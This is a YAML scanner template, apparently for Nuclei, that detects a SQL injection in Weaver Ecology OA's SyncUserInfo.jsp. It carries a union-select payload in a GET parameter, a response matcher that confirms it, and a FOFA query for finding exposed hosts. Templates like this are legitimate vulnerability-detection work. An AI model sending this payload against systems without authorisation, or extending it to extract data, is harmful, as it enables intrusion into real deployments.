id: ecology-syncuserinfo-sqli
info:
  name: Ecology Syncuserinfo - SQL Injection
  author: ritikchaddha
  severity: critical
  description: Ecology Syncuserinfo is vulnerable to SQL injection, allowing attackers
    to potentially access and manipulate sensitive information and perform unauthorized
    administrative actions.
  reference:
  - https://www.weaver.com.cn/
  - https://github.com/chaitin/xray/blob/master/pocs/ecology-syncuserinfo-sqli.yml
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-89
  metadata:
    fofa-query: "app=\"\u6CDB\u5FAE-\u534F\u540C\u529E\u516COA\""
    impact: The SQL injection vulnerability in Ecology Syncuserinfo can enable unauthorized
      access to sensitive data and potentially harm the affected site's operations.
    recommendation: Upgrade to the latest version of Ecology Syncuserinfo to mitigate
      the SQL injection vulnerability and prevent unauthorized access to sensitive
      data.
  tags: ecology,sqli
requests:
- method: GET
  path:
  - '{{BaseURL}}/mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str(98989*44313),null'
  host-redirects: true
  max-redirects: 2
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '4386499557'
  - type: status
    status:
    - 200
